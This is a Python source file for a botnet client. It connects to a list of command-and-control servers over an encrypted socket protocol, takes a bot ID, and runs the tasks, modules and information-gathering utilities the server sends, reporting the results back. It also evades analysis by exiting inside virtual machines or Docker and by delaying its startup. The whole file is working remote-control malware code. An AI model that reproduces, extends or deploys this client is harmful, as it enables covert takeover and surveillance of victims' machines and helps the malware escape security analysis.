import sys
import json
import time
import queue
import socket
import struct
import logging
import datetime
import threading

from utils import OutputLogger, decrypt, encrypt, MessageEncoder, MessageDecoder

from infos import *
from tasks import *
from config import *

from modules.translator import Translator
from modules.activity_analyzer import ActivityAnalyzer
from modules.notifier import Notifier

HOST = '127.0.0.1'
PORT = 8192


class Client:
    """Bot thread manages socket IO.

    Args:
        readque (queue.Queue): Queue where client puts received data.
        writeque (queue.Queue): Queue from which client gets the data.
    """

    def __init__(self, readque: queue.Queue, writeque: queue.Queue):
        super(Client, self).__init__()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.s = None

        self.threads = []
        self.writethr = None
        self.readthr = None
        self.connthr = None

        self.active = threading.Event()
        self.passive = threading.Event()
        self.key_change = threading.Event()

        self.key = C2_ENCRYPTION_KEY
        self.readque = readque
        self.writeque = writeque

    def run(self):
        """Start connection thread."""
        self.connthr = threading.Thread(target=self.connect, args=(HOST, PORT,))
        self.connthr.daemon = False
        self.connthr.start()

    def connect(self, address, port):
        """Connect to C2 server."""
        current_host = 0
        while not self.active.is_set():
            try:
                # create connection
                address, port = C2_HOSTS[current_host].get("ip"), C2_HOSTS[current_host].get("port")
                self.s = socket.create_connection((address, port))
                self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.logger.debug("Connected successfully to: {}".format(self.s.getpeername()))
                self.active.set()
                self.setup_IO()
                break

            except (socket.timeout, socket.error):
                self.logger.debug("Unable to connect to {}:{}. Retrying in {} seconds...".format(address,
                                                                                                 port,
                                                                                                 C2_TIMEOUT))
                time.sleep(C2_TIMEOUT)
                if len(C2_HOSTS) > 1:
                    current_host = current_host + 1
                if current_host >= len(C2_HOSTS):
                    current_host = 0
                continue

            except Exception as e:
                self.logger.error("Socket error while connecting to server: {}".format(str(e)))
                try:
                    self.s.close()
                except socket.error:
                    pass
                self.active.clear()
                continue

    def setup_IO(self):
        """Start read and write threads."""
        self.readthr = threading.Thread(target=self.read)
        self.readthr.daemon = False
        self.readthr.start()

        self.writethr = threading.Thread(target=self.write)
        self.writethr.daemon = False
        self.writethr.start()

    def write(self):
        """Pick data from write queue and send it to C2 server."""
        self.logger.info("Started write thread!")
        while self.active.is_set():
            if not self.writeque.empty():
                data = self.writeque.get()
                try:
                    if isinstance(data.get("result"), Exception):
                        data["result"] = str(data.get("result"))
                    data = json.dumps(data, cls=MessageEncoder).encode()

                    if self.key and self.key_change.is_set():
                        # encrypt assign response with original key
                        if C2_ENCRYPTION_KEY:
                            data = encrypt(data, C2_ENCRYPTION_KEY)
                        self.key_change.clear()

                    elif self.key:
                        data = encrypt(data, self.key)
                    data = struct.pack('!L', len(data)) + data

                except json.JSONDecodeError as e:
                    self.logger.warning("Failed to convert dict to JSON object: {}".format(e))
                    continue

                self.s.sendall(data)
                # self.logger.debug("Sent data to {}: {}".format(self.s.getpeername(), data))
            time.sleep(0.5)
        self.logger.info("Stopped write thread!")

    def read(self):
        """Wait and receive data and put it to read queue."""
        self.logger.info("Started read thread!")
        while self.active.is_set():
            if self.key_change.is_set():
                continue
            header_size = struct.calcsize('!L')
            try:
                header = self.s.recv(header_size)
            except Exception as e:
                self.logger.warning("Socket error while reading data: {}".format(e))
                header = ""

            if len(header) == 4:
                msg_size = struct.unpack('!L', header)[0]
                data = self.s.recv(msg_size)
                if self.key:
                    data = decrypt(data, self.key)
                data = data.decode()
                # self.logger.debug("Received from {}: {}".format(self.s.getpeername(), data))
                try:
                    data = json.loads(data, cls=MessageDecoder)
                    self.readque.put(data)
                except json.JSONDecodeError as e:
                    self.logger.error("Failed to decode message {}: {}".format(data, e))
            else:
                try:
                    self.logger.info("Disconnected from {}".format(self.s.getpeername()))
                except OSError:
                    self.logger.info("Disconnected from server.")
                self.key = C2_ENCRYPTION_KEY
                self.active.clear()
                self.run()
            time.sleep(0.5)
        self.logger.info("Stopped read thread!")

    def stop(self):
        """Stop client and join threads."""
        try:
            self.s.close()
            self.active.clear()
            for t in self.threads:
                t.join()
                t.wait()
            self.logger.info("Client server closed successfully.")
            return 0
        except Exception as e:
            self.logger.error("Error while closing client: ".format(e))
            return 1

    def is_connected(self):
        """Check if client is active."""
        return self.active.is_set()

    def reconnect_to(self, host, port):
        """Reconnect to another C2 server."""
        self.stop()
        self.connect(host, port)

    def assign(self, bot_id, key: str):
        """Assign negotiated encryption key and send response."""
        self.key_change.set()
        self.writeque.put({"event_type": "assign", "bot_id": bot_id, "encryption_key": key})
        self.key = key.encode()


class Main:
    """Main class for client."""

    def __init__(self):
        super(Main, self).__init__()
        self.logger = logging.getLogger(self.__class__.__name__)

        self.client = None
        self.readque = queue.Queue()
        self.writeque = queue.Queue()
        self.running = threading.Event()

        self.id = None
        self.hashcode = None
        self.encryption_key = None
        self.modules = []
        self.tasks = []

    def run(self):
        """Setup client and start read loop."""
        try:
            self.client = Client(self.readque, self.writeque)
            self.client.run()
            self.running.set()
        except Exception as e:
            self.logger.error("Failed to start client thread: {}".format(e))
            return 1

        while self.running.is_set():
            if self.client.is_connected():
                if not self.readque.empty():
                    data = self.readque.get()
                    event_type = data.get("event_type")

                    if event_type == "assign":
                        self.id = data.get("bot_id")
                        self.hashcode = data.get("hashcode")
                        self.encryption_key = data.get("encryption_key")
                        self.logger.info("Assigned new ID {}".format(self.id))

                        if self.encryption_key:
                            self.client.assign(self.id, self.encryption_key)

                        for task in self.tasks:
                            running = task.serialize()
                            running["event_type"] = "task"
                            self.writeque.put(running)

                    else:
                        if self.id is None:
                            self.logger.error("Assign ID before sending messages!")
                            continue

                        elif data.get("bot_id") == self.id:
                            if event_type == "info":
                                # execute utility with matching name
                                info_list = data.get("info")
                                if type(info_list) is list:
                                    resp = {}
                                    resp["event_type"] = "info"
                                    resp["info"] = data.get("info")
                                    resp["start_time"] = data.get("send_time")
                                    resp["results"] = {}
                                    for info in info_list:
                                        if info == "tasks":
                                            resp["results"][info] = self._running_tasks()
                                        elif info == "modules":
                                            resp["results"][info] = self._enabled_modules()
                                        else:
                                            self.logger.info("Running utility {}/{}: {}".format(info_list.index(info)
                                                                                                + 1,
                                                                                                len(info_list), info))
                                            try:
                                                resp["results"][info] = {}
                                                resp["results"][info]["result"] = globals()[info]()
                                                resp["results"][info]["exit_code"] = 0

                                            except KeyError as e:
                                                self.logger.error(
                                                    "Utility {} not imported or does not exist".format(info))
                                                resp["results"][info]["result"] = "KeyError: {}".format(str(e))
                                                resp["results"][info]["exit_code"] = 1

                                            except Exception as e:
                                                self.logger.error(
                                                    "Error while processing utility {}: {}".format(info, e))
                                                resp["results"][info]["result"] = "Exception: {}".format(str(e))
                                                resp["results"][info]["exit_code"] = 1

                                    resp["finish_time"] = time.time()
                                    self.writeque.put(resp)

                            elif event_type == "module":
                                # check in modules if exists and enable or disable it
                                module = data.get("module")
                                enabled = data.get("enabled")
                                try:
                                    module_cls = getattr(sys.modules[__name__], module)
                                    module_cls.enabled = enabled
                                    self.writeque.put(
                                        {"event_type": "module", "module": data.get("module"),
                                         "enabled": module_cls.enabled})

                                except AttributeError:
                                    self.logger.warning("Module {} not found!".format(module))
                                    self.writeque.put(
                                        {"event_type": "module", "module": data.get("module"),
                                         "enabled": None})

                            elif event_type == "task":
                                # process task
                                task = data.get("task")
                                task_id = data.get("task_id")
                                event = data.get("event")
                                if event == "stop":
                                    task_obj = self._get_task_by_id(task_id)
                                    # check if task running and stop it
                                    if task_obj:
                                        self.logger.debug("Trying to stop task {}".format(task_obj.id))
                                        task_obj.stop()
                                        self.logger.info("Task {} stopped successfully".format(task_obj.id))
                                        continue

                                elif event == "terminate":
                                    task_obj = self._get_task_by_id(task_id)
                                    if task_obj:
                                        self.logger.debug("Trying to terminate task {}".format(task_obj.id))
                                        task_obj.stop()
                                        self.tasks.remove(task_obj)
                                        continue

                                if task not in self._running_task_types():
                                    try:
                                        task_obj = getattr(sys.modules[__name__], task)(task_id)
                                        task_thr = task_obj.start()
                                        task_obj.set_thread(task_thr)
                                        task_obj.time_started = datetime.datetime.now()
                                        self.tasks.append(task_obj)
                                        self.writeque.put(
                                            {"event_type": "task", "task": task,
                                             "task_id": task_id, "state": "started"})

                                    except Exception as e:
                                        self.logger.error("Failed to start task {}: {}".format(task_id, e))
                                        self.writeque.put(
                                            {"event_type": "task", "task": task, "task_id": task_id,
                                             "state": "finished", "result": e, "exit_code": 1})

                            else:
                                self.logger.error("Failed to find matching event type for message: {}".format(data))
            else:
                # stop task, which should be run only when conneted
                for task in self.tasks:
                    if task.stop_if_disconnected:
                        task.stop()
                        task.join()

            if self.id is not None:
                # post message processing
                # check finished tasks
                self._check_task_finished()
            time.sleep(0.5)

        self.close()

    def _enabled_modules(self):
        return [module.serialize() for module in self.modules]

    def _running_tasks(self):
        return [task.serialize() for task in self.tasks]

    def _running_task_types(self):
        return [task.__class__.__name__ for task in self.tasks]

    def _get_task_by_id(self, task_id):
        for task in self.tasks:
            if task.id == task_id:
                return task

    def _check_task_finished(self):
        for task in self.tasks:
            if not task.is_alive():
                result = task.join(0)
                if result is not None:
                    task.set_finished(result.get("result"), result.get("exit_code"))
                    task.time_finished = datetime.datetime.now()
                    if self.client.is_connected():
                        sendable = task.serialize()
                        self.writeque.put(sendable)
                        self.tasks.remove(task)

    def close(self):
        for task in self.tasks:
            task.join()
        sys.exit(self.client.stop())


if __name__ == '__main__':
    try:
        if not ALLOW_VM and is_running_in_vm() or not ALLOW_DOCKER and is_running_in_docker():
            sys.exit(0)
    except Exception:
        if not ALLOW_IF_VM_CHECK_FAILS:
            sys.exit(0)

    if STARTUP_DELAY:
        time.sleep(STARTUP_DELAY)

    log = OutputLogger()
    m = Main()
    m.run()
